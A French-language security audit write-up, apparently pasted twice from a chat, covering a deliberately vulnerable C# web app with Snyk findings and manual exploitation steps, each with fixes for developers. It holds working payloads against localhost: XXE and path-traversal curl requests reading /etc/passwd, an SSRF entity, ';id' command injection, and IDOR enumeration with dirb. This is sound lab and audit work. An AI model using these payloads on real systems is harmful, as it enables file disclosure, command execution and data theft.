

# ⬇️ Vulnérabilités trouvées en utilisant le scanner snyk.io



## Critique 🔥🔥🔥🔥🔥

### 🔸 1. Utilisation de secrets codés en dur (CWE-798)
Où ? Fichier Docker

### Commentaire :

Présence d’un utilisateur et mot de passe codés en dur dans les variables d’environnement


### 🔸 2. Exposure of Sensitive Information to an Unauthorized Actor (CWE-200)
Où ? Pas encore trouvé (à priori Program.cs ou Controller.cs)

### Commentaire :

Possibilité d'accéder à des ressources du serveur pour lesquelles nous ne sommes pas autorisés, comme par exemple /etc/hosts ou /etc/passwd



## Hautes 🔥🔥🔥

### 🔸 3. Deserialization of Untrusted Data (CWE-502) + Code injection (CWE-94)

Où ? Program.cs - Ligne 91

app.MapGet("/NewEmployee", async (string i) => await Task.FromResult(VLAController.VulnerableDeserialize(HttpUtility.UrlDecode(i)))).WithOpenApi();

### Commentaires :
#### 3.1.
Snyk : Deserialization of Untrusted Data : Unsanitized input from an HTTP parameter flows into global::Newtonsoft.Json.JsonConvert.DeserializeObject, where it is used to deserialize an object. This may result in an Unsafe Deserialization vulnerability.

Explication : Une donnée non contrôlée (provenant de la requête HTTP) est transmise directement à JsonConvert.DeserializeObject pour être désérialisée. Cela permettrait à un utilisateur malveillant de forger un objet arbitraire pouvant exécuter du code malicieux à la désérialisation.

Recommandation pour les développeurs : N’utilisez jamais JsonConvert.DeserializeObject sur des données provenant de l’utilisateur sans validation stricte du format et du type attendu. Préférez la désérialisation vers des types explicites et limitez l’usage de types dynamiques.


#### 3.2.
Snyk : Code injection : Commentaire : Unsanitized input from an HTTP parameter flows into global::Newtonsoft.Json.JsonConvert.DeserializeObject, where it is used to deserialize an object. This may result in an Unsafe Deserialization vulnerability.

Explication : La désérialisation de données non sécurisées peut inclure des instructions ou objets capables d’exécuter du code sur le serveur, aboutissant à une injection de code si la configuration ou le type cible est vulnérable.

Recommandation pour les développeurs : Désactivez les fonctionnalités de typage automatique (TypeNameHandling) dans Json.NET, et validez rigoureusement les données entrantes. Évitez les désérialisations sur des types génériques ou inconnus.

-----


### 🔸 4. SSRF (CWE-94) + XXE Injection (CWE-611)

Où ? Program.cs - Ligne 85

app.MapGet("/Contract", async (string i) => await Task.FromResult(VLAController.VulnerableXmlParser(HttpUtility.UrlDecode(i)))).WithOpenApi();


### Commentaires :

#### SSRF (Server-Side Request Forgery)
Snyk : Unsanitized input from an HTTP parameter flows into Load, where it is used as an URL to perform a request. This may result in a Server-Side Request Forgery vulnerability.

Explication : L’entrée utilisateur est utilisée comme source de données XML sans contrôle. Cela peut permettre à un attaquant de forcer le serveur à envoyer des requêtes internes ou externes, souvent vers des ressources internes protégées.

Recommandation pour les développeurs : Ne chargez jamais de ressources distantes (URL) depuis une donnée utilisateur. Validez strictement l’entrée et utilisez des parsers XML configurés pour refuser les ressources externes.

#### XXE (XML External Entity)
Snyk : Unsanitized input from an HTTP parameter flows to global::System.Xml.XmlReader.Create. This may result in an XXE vulnerability.

Explication : Le parseur XML peut traiter des entités externes définies dans l’input, ce qui permettrait à un attaquant d’accéder à des fichiers locaux ou de provoquer des requêtes vers des ressources internes.

Recommandation pour les développeurs : Désactivez la résolution des entités externes dans XmlReaderSettings (DtdProcessing = Prohibit) et évitez les DTD dans les données XML entrantes.

Requête pour récupérer le contenu de etc/passwd :

curl -k https://localhost:3000/Contract?i=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%20%3C%21DOCTYPE%20foo%20%5B%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%20%5D%3E%20%3CstockCheck%3E%3CproductId%3E%26xxe%3B%3C%2FproductId%3E%3C%2FstockCheck%3E -H "Authorization: Bearer (TokenHere)"

## Moyennes 🔥

### 🔸 5. XML Injection (CWE-91)

Où ? Program.cs - Ligne 85

app.MapGet("/Contract", async (string i) => await Task.FromResult(VLAController.VulnerableXmlParser(HttpUtility.UrlDecode(i)))).WithOpenApi();


### Commentaire :

Unsanitized input from an HTTP parameter flows into global::System.Xml.XmlReader.Create, where it is used as XML input. This may result in an XML Injection vulnerability.


-----



# ⬇️ Vulnérabilités sans snyk.io


### 🔹 6. Path Traversal (CWE-22)
... (124lignes restantes)
Réduire
message.txt
14 Ko
﻿
yassmth
aktsk__
 
Chill

# ⬇️ Vulnérabilités trouvées en utilisant le scanner snyk.io



## Critique 🔥🔥🔥🔥🔥

### 🔸 1. Utilisation de secrets codés en dur (CWE-798)
Où ? Fichier Docker

### Commentaire :

Présence d’un utilisateur et mot de passe codés en dur dans les variables d’environnement


### 🔸 2. Exposure of Sensitive Information to an Unauthorized Actor (CWE-200)
Où ? Pas encore trouvé (à priori Program.cs ou Controller.cs)

### Commentaire :

Possibilité d'accéder à des ressources du serveur pour lesquelles nous ne sommes pas autorisés, comme par exemple /etc/hosts ou /etc/passwd



## Hautes 🔥🔥🔥

### 🔸 3. Deserialization of Untrusted Data (CWE-502) + Code injection (CWE-94)

Où ? Program.cs - Ligne 91

app.MapGet("/NewEmployee", async (string i) => await Task.FromResult(VLAController.VulnerableDeserialize(HttpUtility.UrlDecode(i)))).WithOpenApi();

### Commentaires :
#### 3.1.
Snyk : Deserialization of Untrusted Data : Unsanitized input from an HTTP parameter flows into global::Newtonsoft.Json.JsonConvert.DeserializeObject, where it is used to deserialize an object. This may result in an Unsafe Deserialization vulnerability.

Explication : Une donnée non contrôlée (provenant de la requête HTTP) est transmise directement à JsonConvert.DeserializeObject pour être désérialisée. Cela permettrait à un utilisateur malveillant de forger un objet arbitraire pouvant exécuter du code malicieux à la désérialisation.

Recommandation pour les développeurs : N’utilisez jamais JsonConvert.DeserializeObject sur des données provenant de l’utilisateur sans validation stricte du format et du type attendu. Préférez la désérialisation vers des types explicites et limitez l’usage de types dynamiques.


#### 3.2.
Snyk : Code injection : Commentaire : Unsanitized input from an HTTP parameter flows into global::Newtonsoft.Json.JsonConvert.DeserializeObject, where it is used to deserialize an object. This may result in an Unsafe Deserialization vulnerability.

Explication : La désérialisation de données non sécurisées peut inclure des instructions ou objets capables d’exécuter du code sur le serveur, aboutissant à une injection de code si la configuration ou le type cible est vulnérable.

Recommandation pour les développeurs : Désactivez les fonctionnalités de typage automatique (TypeNameHandling) dans Json.NET, et validez rigoureusement les données entrantes. Évitez les désérialisations sur des types génériques ou inconnus.

-----


### 🔸 4. SSRF (CWE-94) + XXE Injection (CWE-611)

Program.cs - Ligne 85

app.MapGet("/Contract", async (string i) => await Task.FromResult(VLAController.VulnerableXmlParser(HttpUtility.UrlDecode(i)))).WithOpenApi();

#### 4. XXE (XML External Entity)
Snyk : Unsanitized input from an HTTP parameter flows to global::System.Xml.XmlReader.Create. This may result in an XXE vulnerability.

Explication : Le parseur XML peut traiter des entités externes définies dans l’input, ce qui permettrait à un attaquant d’accéder à des fichiers locaux ou de provoquer des requêtes vers des ressources internes.

Recommandation pour les développeurs : Désactivez la résolution des entités externes dans XmlReaderSettings (DtdProcessing = Prohibit) et évitez les DTD dans les données XML entrantes.

Ici on éxécute des requêtes curl sur la page /Contract, et on se rend rapidement compte que le serveur nous répond "System.Xml.XmlException" ainsi que plusieurs erreurs, montrant déjà que le serveur s'attend à recevoir du xml, donc potentiellement une vulnérabilité xxe éxploitable.

Puisque le serveur s'attend à recevoir du xml, on lui envoie ensuite quelques requêtes curl contenant du xml ( traduit en ascii car les caractères spéciaux sont interprétés en tant que cmdlet linux ), et on se rend rapidement compte que le parser xml est mal configuré car on peut facilement accéder à des fichiers locaux.

Requête pour récupérer le contenu de etc/passwd :

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

Traduite en ascii, ce qui donne : 

curl -k https://localhost:3000/Contract?i=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%20%3C%21DOCTYPE%20foo%20%5B%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%20%5D%3E%20%3CstockCheck%3E%3CproductId%3E%26xxe%3B%3C%2FproductId%3E%3C%2FstockCheck%3E -H "Authorization: Bearer (TokenHere)"

Nous récupérons donc bien par la suite le contenu de etc/passwd, en appellant l'entité file.

## Moyennes 🔥

### 🔹 5. Server-Side Request Forgery (SSRF) (CWE-918)

**📍 Où ?** `VLAController.cs` – Méthode `VulnerableWebRequest`

- **Snyk :** Une requête HTTP est effectuée en fonction d’une URL potentiellement contrôlée par l'utilisateur.  
- **Explication :** Bien que l’URL soit filtrée pour s'assurer qu’elle commence par `https://localhost`, cette vérification reste fragile face à certaines techniques de contournement.  
- **Recommandation pour les développeurs :** Utiliser une liste blanche d’hôtes autorisés ou une validation stricte sur le format complet de l’URL, y compris IP, port et domaine.

Le contenu xml :

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:8000/test.txt">
]>
<contract>
    <name>&xxe;</name>
</contract>

Traduit ensuite pour l'inclure dans une requête curl : 

curl -k https://localhost:3000/contract?i=%3C%21DOCTYPE%20foo%20%5B%20%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F127.0.0.1%3A8000%2Ftest.txt%22%3E%20%5D%3E%20%3Ccontract%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fcontract%3E -H "Authorization: Bearer (Token Here )"

L'exemple ici n'est pas totalement représentatif de ce que peut réellement faire une ssrf.
Avec cette méthode, qui contourne souvent les protections ( car les droits sont segmentés ) on peut tenter d'accéder à des services internes...

### 🔸 5. XML Injection (CWE-91)

Où ? Program.cs - Ligne 85

app.MapGet("/Contract", async (string i) => await Task.FromResult(VLAController.VulnerableXmlParser(HttpUtility.UrlDecode(i)))).WithOpenApi();


### Commentaire :

Unsanitized input from an HTTP parameter flows into global::System.Xml.XmlReader.Create, where it is used as XML input. This may result in an XML Injection vulnerability.

-----


# ⬇️ Vulnérabilités sans snyk.io


### 🔹 6. Path Traversal (CWE-22)

**📍 Où ?** `VLAController.cs` – Méthode `VulnerableHelloWorld`

- **Snyk :** Utilisation d’un nom de fichier provenant de l’utilisateur sans validation suffisante. Cela permet potentiellement l’accès à des fichiers en dehors du répertoire prévu.  
- **Explication :** L’utilisateur peut manipuler le paramètre `FileName` pour accéder à des fichiers système ou sensibles via des séquences de type `../`.  
- **Recommandation pour les développeurs :** Restreindre la valeur du nom de fichier à une liste blanche et valider rigoureusement le chemin via une API sécurisée (ex. `Path.GetFullPath` + vérification de répertoire).

à partir du paramètre trouvé grâce à l'étape de la reconnaissance ( dirb ), on trouve que ?lang=test donne un code 200, ce qui nous amène par la suite à tenter de trouver une vulnérabilité évidente (LFI); on le voit dès la première érreur mentionnée en lançant notre requête: "Could not find file".

à partir de là, on peut récupérer le contenu de certains fichiers présents dans le répertoire actuel, en cherchant bien sûr, des wordlist contenant des noms probables de fichiers ( en rajoutant également des éxtensions .json, .txt ...)

pour notre part, on a réalisé un script qui s'occupe de trouver des fichiers potentiellement éxistants, et qui fait également du path traversal, pour trouver un maximum de fichiers possible.

Requête pour récupérer le contenu /etc/passwd :

---> curl -k "https://localhost:3000/?lang=/etc/passwd" -H "Authorization:bearer (TokenHere)"
La requête fonctionne avec lang=/etc/passwd, mais si on a des soucis par la suite pour faire du path traversal ( le code qui interdit certains caractères ), on peut utiliser les caractères ascii : 
---> curl -k "https://localhost:3000/?lang=%2fetc%2fpasswd -H "Authorization:bearer (TokenHere)"



### 🔹 7. Arbitrary File Write (CWE-73)

**📍 Où ?** `VLAController.cs` – Méthode `VulnerableLogs`

- **Snyk :** Le nom du fichier de log est contrôlé par l'utilisateur. Cela permet potentiellement l'écriture de contenu dans des fichiers arbitraires.  
- **Explication :** Si le paramètre `LogFile` est manipulé, l’utilisateur peut écraser ou modifier des fichiers critiques du système.  
- **Recommandation pour les développeurs :** Ne jamais utiliser un nom de fichier venant de l'utilisateur sans validation. Restreindre l’accès à un dossier dédié avec des noms de fichiers pré-approuvés.

---

### 🔹 9. Insecure Direct Object Reference (IDOR) (CWE-639)

**📍 Où ?** `VLAController.cs` – Méthode `VulnerableObjectReference`

- **Snyk :** Le paramètre `Id` est utilisé directement pour retrouver un utilisateur sans vérification d’autorisation.  
- **Explication :** Cela permet à un utilisateur malveillant d’accéder à des données d’autres employés simplement en changeant l’ID dans la requête.  
- **Recommandation pour les développeurs :** Implémenter une logique d’autorisation stricte basée sur l’utilisateur connecté et vérifier que l’ID demandé lui appartient.

sur la page /employee, en tentant une valeur au hasard sur le paramètre i ( ?i=1 ), on constate qu'on récupère des données confidentielles, qui contiennent même les adresses 
on a donc plus qu'à créer une liste de nombres de 0 à 2 000 par exemple, ( seq 0 2000 > list.txt ) et d'utiliser dirb afin de trouver un maximum d'informations confidentielles.

---> dirb https://localhost:3000/employee?i= list.txt -H "TokenHere"

ou à défaut, utiliser seclist, mais ça aurait moins d'interêt que de créer soit même une petite liste de nombres avec seq.

---> dirb https://localhost:3000/employee?i= /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -H "TokenHere"
On découvre ensuite des données confidentielles d'une quinzaine d'employés.

---

### 🔹 10. Command Injection (CWE-77)

**📍 Où ?** `VLAController.cs` – Méthode `VulnerableCmd`

- **Snyk :** Le paramètre `UserStr` est utilisé pour construire une commande shell sans échappement.  
- **Explication :** Un attaquant pourrait injecter une commande arbitraire dans l’appel `nslookup`, conduisant à l’exécution de commandes système non prévues.  
- **Recommandation pour les développeurs :** Ne jamais insérer de chaînes utilisateur dans une commande shell. Utiliser des API sécurisées pour DNS ou échapper correctement les arguments.

La page concernée ici est localdnsresolver, l'url n'a cependant pas encore pu être trouvée en utilisant des wordlist ( à l'étape de la reconnaissance ), mais a pu être observée à plusieurs reprises dans des fichiers de logs.
Elle peut être éxploitée car l’application ne filtre pas correctement les entrées utilisateurs. 
Après avoir tenté un dirb pour trouver un paramètre valide, on comprend que la requête s'attend à recevoir une entrée sous forme de domaine, et on trouve une vulnérabilité éxploitable en ajourant un séparateur ";", ce qui nous permet par la suite d'injecter des commandes.

---> curl -k "https://localhost:3000/localdnsresolver?i=www.support.com;id" -H "Authorization: Bearer (TokenHere)

---

### 🔹 11. Buffer Overflow (CWE-120)

**📍 Où ?** `VLAController.cs` – Méthode `VulnerableBuffer`

- **Snyk :** Copie de caractères utilisateur dans un buffer alloué manuellement sans vérification de dépassement.  
- **Explication :** Si l’entrée dépasse les 50 caractères, cela provoque un dépassement de tampon pouvant corrompre la mémoire.  
- **Recommandation pour les développeurs :** Éviter les allocations manuelles de mémoire ou s’assurer de tronquer l’entrée à la taille maximale autorisée.

---

### 🔹 12. Arbitrary Code Execution via C# Script (CWE-94)

**📍 Où ?** `VLAController.cs` – Méthode `VulnerableCodeExecution`

- **Snyk :** L’entrée utilisateur est passée à `CSharpScript.EvaluateAsync` sans validation complète.  
- **Explication :** Même avec les restrictions sur les mots-clés `class` et `using`, un attaquant peut contourner ces filtres et exécuter du code arbitraire en C#.  
- **Recommandation pour les développeurs :** Ne jamais évaluer dynamiquement du code fourni par l’utilisateur. Utiliser des calculs prédéfinis ou des parsers d'expressions mathématiques sécurisés.

---

### 🔹 13. Unrestricted File Upload (CWE-434)

**📍 Où ?** `VLAController.cs` – Méthode `VulnerableHandleFileUpload`

- **Snyk :** L'utilisateur peut uploader un fichier `.svg` sans analyse de contenu, ni vérification du chemin.  
- **Explication :** Les fichiers SVG peuvent contenir du code JavaScript (via `<script>`) et être utilisés pour exécuter des attaques XSS.  
- **Recommandation pour les développeurs :** Vérifier le contenu des fichiers uploadés, enregistrer dans un répertoire isolé, et désactiver l’exécution côté serveur.


### 🔹 14. Open Redirect / URL Injection (CWE-601)

**📍 Où ?** `Program.cs` – Traitement de `--url=` dans les arguments

- **Snyk :** L'URL d'écoute du serveur peut être modifiée via une chaîne `--url=` passée en ligne de commande.  
- **Explication :** Cette valeur est utilisée sans validation dans `app.Urls.Add(...)`, permettant à un utilisateur malveillant de forcer l’application à écouter sur des interfaces non prévues.  
- **Recommandation pour les développeurs :** Valider la chaîne passée en paramètre (format, protocole, port autorisé) ou restreindre les valeurs à une liste blanche.

---

### 🔹 15. Reflected XSS via Query Parameters (CWE-79)

**📍 Où ?** `Program.cs` – Route `/` avec paramètre `lang`

- **Snyk :** Le paramètre `lang` est passé directement à `VulnerableHelloWorld` puis utilisé pour lire un fichier, dont le contenu est renvoyé sans encodage.  
- **Explication :** Un fichier piégé (par ex. HTML contenant `<script>`) peut être injecté et renvoyé dans la réponse, déclenchant une exécution de code côté client.  
- **Recommandation pour les développeurs :** Ne jamais afficher directement du contenu de fichier sans l’encoder (`HtmlEncode`). Valider les noms de fichiers et filtrer les extensions.

---

### 🔹 16. GraphQL Introspection Exposée (CWE-200)

**📍 Où ?** `Program.cs` – Routes `/Client` et `/GraphQLUI`

- **Snyk :** L’interface GraphQL UI est exposée publiquement, tout comme le schéma introspectif.  
- **Explication :** Cela permet à un attaquant d’explorer toute l’API GraphQL, même sans authentification, facilitant la recherche d’objets ou mutations sensibles.  
- **Recommandation pour les développeurs :** Désactiver l’introspection en production et restreindre l’accès à `/GraphQLUI` par rôle ou adresse IP.
- 
La requête ci-dessous est découpée avec des backslash pour faire plus propre, et ne pas tout écrire sur une seule ligne.

curl -k -X POST https://localhost:3000/client \
  -H "Authorization: Bearer (TokenHere)" \
  -H "Content-Type: application/json" \
  -H "GraphQL-Require-Preflight: 1" \ // ( Non obligatoire )
  -d '{"query":"{clientsByBank(bank:1){id name bank}}"}'

  On récupère ici des informations sur les employés ( prénoms, banques... ) 

  Il éxiste également une query pour récupérer tous les champs disponibles :

 ---> Burp suite :
{
  "query": "{ __schema { queryType { name } types { name fields { name } } } }"
}
 ---> curl : 
 
 -d '{"query":"{ __schema { types { name fields { name } } } }"}'

Dans un scénario élaboré, on aurait peut être pu entrevoir la possibilité d'une csrf, en admettant qu'on connaisse le noms de leurs banques, qu'on sache que la victime est connectée à sa banque en ligne, l'url du virement, que la protection CSRF soit assez faible...
Mais le message "CSRF_PROTECTION" en réponse, lors de l'éxploitation de la vulnérabilité, nous laisse croire qu'une protection a été prévue pour.

---

### 🔹 17. Insecure Deserialization en Entrée API (doublon mais réexploité via `MapGet`)

**📍 Où ?** `Program.cs` – Route `/NewEmployee`

- **Snyk :** La route expose une désérialisation non sécurisée via `VulnerableDeserialize`.  
- **Explication :** Même si déjà rapportée, ici la vulnérabilité est directement exposée via une API publique accessible en GET avec données encodées.  
- **Recommandation pour les développeurs :** Supprimer la désérialisation dynamique ou utiliser des types connus, validés. Passer la méthode en POST avec body JSON validé par un schéma.
message.txt
14 Ko
